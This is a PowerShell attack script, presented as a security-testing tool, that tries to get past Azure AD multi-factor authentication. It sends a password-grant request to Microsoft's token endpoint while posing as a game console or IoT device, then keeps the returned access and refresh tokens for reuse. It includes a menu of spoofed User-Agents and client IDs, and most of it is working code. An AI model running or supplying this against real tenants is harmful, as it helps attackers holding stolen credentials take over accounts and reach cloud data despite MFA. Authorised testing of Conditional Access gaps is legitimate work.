<#-------------------------------------------------------------
.SYNOPSIS
    Performs an MFA bypass test against Azure AD by simulating a legacy or non-browser client.

.DESCRIPTION
    This script uses the Resource Owner Password Credential (ROPC) grant flow to authenticate directly to Azure AD 
    using a supplied username and password. It spoofs the User-Agent header to impersonate a non-browser device 
    (such as a PlayStation, Xbox, or IoT client), which are often excluded from Conditional Access policies.

    If successful, the script retrieves an access token, refresh token, and ID token, and stores them in a global
    PowerShell variable ($MFApwn) as a custom object for reuse in the session.

.PARAMETER Username
    The Azure AD username (email format) to authenticate as.

.PARAMETER Password
    The associated password for the Azure AD account. Securely entered at runtime.

.OUTPUTS
    - If successful, the access token is stored in $MFApwn.access_token
    - You can then use this token to make authenticated Graph API or ARM API requests

.EXAMPLE
    .\UA_MFA_bypass.ps1

    After running:
        $MFApwn.access_token     # Access token
        $MFApwn.refresh_token    # Refresh token
        $MFApwn.id_token         # Identity claims token

    Example usage:
        Invoke-RestMethod -Headers @{Authorization = "Bearer $($MFApwn.access_token)"} -Uri "https://graph.microsoft.com/v1.0/me"

.NOTES
    - This script is intended for security testing in lab environments.
    - Ensure you have permission to use this method in any production or live tenant.
    - Tokens issued depend on tenant policies, scopes, and client configuration.
    - The spoofed User-Agent can be modified for additional bypass testing.

.AUTHOR
    @fhd342gs
-----------------------------------------------------------#>


### Legacy / non-stadard user-agents. Chose your poison:

# PlayStation 4          - Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)
# PlayStation 5          - Mozilla/5.0 (PlayStation 5 4.03) AppleWebKit/605.1.15 (KHTML, like Gecko)
# PS Vita                - Mozilla/5.0 (PlayStation Vita 3.60) AppleWebKit/537.73 (KHTML, like Gecko)
# Xbox One               - Xbox/One/10.0.10586.1100 Mozilla/5.0
# Nintendo Switch	     - Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko)
# Wii U                  - Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko)
# BlackBerry 6           - BlackBerry9700/5.0.0.862 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/331
# Symbian S60            - Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.12344
# Smart TV (Samsung)     - Mozilla/5.0 (SMART-TV; Linux; Tizen 3.0) AppleWebKit/537.36
# Amazon Echo            - Dalvik/2.1.0 (Linux; U; Android 5.1; AFTS Build/LMY47O)
# Sonos Speaker          - Linux UPnP/1.0 Sonos/34.16-37101 (ZP120)
# Generic IoT            - iot-device/1.0 (Linux; U; Android 9; en-us)

# Prompt for credentials
$Username = Read-Host "Enter username (email)"
$Password = Read-Host "Enter password" -AsSecureString
$UnsecurePassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
)

# Prepare request
$Body = @{

    ## Choose which endpoint to query depending on your scope
    #resource    = "https://graph.microsoft.com"     # Microsoft Graph (for AzureAD, Entra)
    resource    = "https://management.azure.com"    # Azure Resource Manager (for az, Connect-AzAccount)
    #resource     = "https://storage.azure.com"      # Azure Storage (Data Plane Access — Blobs, Files, Queues) 

    ## Choose needed Client_ID
    client_id   = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"     # ID of Azure CLI good for Azure scope
    #client_id   = "a0c73c16-a7e3-4564-9a95-2bdf47383716"     # ID of Microsoft Graph SDK 
    #client_id   = "b26aadf8-566f-4478-926f-589f601d9c74"     # ID of OneDrive Sync 
    #client_id   = "ddc29362-4cc5-4cd0-b5b6-9b998b8c7d5b"     # ID of Intune Company Portal 
    #client_id   = "1b730954-1685-4b74-9bfd-dac224a7b894"     # ID of Azure PowerShell public client
    #client_id   = "d3590ed6-52b3-4102-aeff-aad2292ab01c"     # ID of MSTeams client, if you re planning to do some TokenTactics
    grant_type  = "password"
    username    = $Username
    password    = $UnsecurePassword
    scope       = "openid"
}

$Headers = @{
    ## Change User-Agent per you requirement
    "User-Agent"   = "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)"     # Choose another user-agent from above list
    "Content-Type" = "application/x-www-form-urlencoded"
}

try {
    $response = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/token" -Headers $Headers -Body $Body -ErrorAction Stop

    if ($response.access_token) {
        Write-Host "`n[+] Token retrieved successfully." -ForegroundColor Green

        $MFApwn = [pscustomobject]@{
            access_token  = $response.access_token
            refresh_token = $response.refresh_token
            id_token      = $response.id_token
            token_type    = $response.token_type
            expires_in    = $response.expires_in
        }

        Set-Variable -Name MFApwn -Value $MFApwn -Scope Global

        Write-Host "`n[+] Tokens stored in `$MFApwn"
        Write-Host "    Access like: `$MFApwn.access_token"
#        Write-Host "    Try: Invoke-RestMethod -Headers @{ Authorization = 'Bearer $($MFApwn.access_token)' } -Uri 'https://graph.microsoft.com/v1.0/me'"
    }
    else {
        Write-Host "`n[-] Token not retrieved. No access_token field." -ForegroundColor Yellow
        $response | ConvertTo-Json -Depth 3
    }
}
catch {
    Write-Host "`n[!] Request failed:" -ForegroundColor Red
    $_.Exception.Message
}

